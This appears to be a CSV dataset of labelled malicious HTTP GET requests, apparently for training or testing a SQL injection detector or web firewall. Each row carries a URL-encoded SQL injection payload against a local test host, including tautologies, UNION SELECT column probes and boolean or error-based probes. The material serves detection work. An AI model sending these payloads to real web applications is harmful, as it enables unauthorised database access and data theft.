"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_000018","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1700%25%27+or+4149%3D3391%23","/","p=-1700%25%27+or+4149%3D3391%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1700%25%27+or+4149%3D3391%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000019","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1710%22%29%29+as+cvky+where+1858%3D1858+union+all+select+1858%2C1858--","/","p=-1710%22%29%29+as+cvky+where+1858%3D1858+union+all+select+1858%2C1858--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1710%22%29%29+as+cvky+where+1858%3D1858+union+all+select+1858%2C1858-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000020","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1722%27+union+all+select+1408%2C1408%2C1408%23","/","p=-1722%27+union+all+select+1408%2C1408%2C1408%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1722%27+union+all+select+1408%2C1408%2C1408%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000021","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1766%22%29%29%29+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%28%28%28%22ydzq%22+like+%22ydzq","/","p=-1766%22%29%29%29+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%28%28%28%22ydzq%22+like+%22ydzq","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1766%22%29%29%29+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%28%28%28%22ydzq%22+like+%22ydzq HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000022","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1772%27+or+7911%3D4985%23","/","p=-1772%27+or+7911%3D4985%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1772%27+or+7911%3D4985%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000023","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1920%27%29%29%29+union+all+select+1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%23","/","p=-1920%27%29%29%29+union+all+select+1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1920%27%29%29%29+union+all+select+1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%2C1424%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000024","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1940+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29","/","p=-1940+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1940+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000025","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1985%29%29%29+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29+and+%28%28%281248%3D1248","/","p=-1985%29%29%29+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29+and+%28%28%281248%3D1248","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1985%29%29%29+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29+and+%28%28%281248%3D1248 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000026","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2032%25%22%29%29%29+or+%283082%3D7155%29%2A7155+and+%28%28%28%22%25%22%3D%22","/","p=-2032%25%22%29%29%29+or+%283082%3D7155%29%2A7155+and+%28%28%28%22%25%22%3D%22","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2032%25%22%29%29%29+or+%283082%3D7155%29%2A7155+and+%28%28%28%22%25%22%3D%22 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000027","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2207%25%27%29%29+union+all+select+3339%2C3339%2C3339%2C3339%2C3339%2C3339%23","/","p=-2207%25%27%29%29+union+all+select+3339%2C3339%2C3339%2C3339%2C3339%2C3339%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2207%25%27%29%29+union+all+select+3339%2C3339%2C3339%2C3339%2C3339%2C3339%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000028","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2291%29%29+or+4067%3D5666%23","/","p=-2291%29%29+or+4067%3D5666%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2291%29%29+or+4067%3D5666%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000029","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2321%25%22%29+or+2271%3D7683--","/","p=-2321%25%22%29+or+2271%3D7683--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2321%25%22%29+or+2271%3D7683-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000030","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2430%27%29+union+all+select+5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712--","/","p=-2430%27%29+union+all+select+5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2430%27%29+union+all+select+5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000031","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2453%22%29+union+all+select+4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520--","/","p=-2453%22%29+union+all+select+4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2453%22%29+union+all+select+4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520%2C4520-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000032","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2505%27+or+9323%3D9323%23","/","p=-2505%27+or+9323%3D9323%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2505%27+or+9323%3D9323%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000033","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2625%22%29%29+as+qfuo+where+1980%3D1980+union+all+select+1980%2C1980%2C1980--","/","p=-2625%22%29%29+as+qfuo+where+1980%3D1980+union+all+select+1980%2C1980%2C1980--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2625%22%29%29+as+qfuo+where+1980%3D1980+union+all+select+1980%2C1980%2C1980-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000034","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2626%25%27%29+or+elt%287513%3D8586%2C8586%29+and+%28%27%25%27%3D%27","/","p=-2626%25%27%29+or+elt%287513%3D8586%2C8586%29+and+%28%27%25%27%3D%27","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2626%25%27%29+or+elt%287513%3D8586%2C8586%29+and+%28%27%25%27%3D%27 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
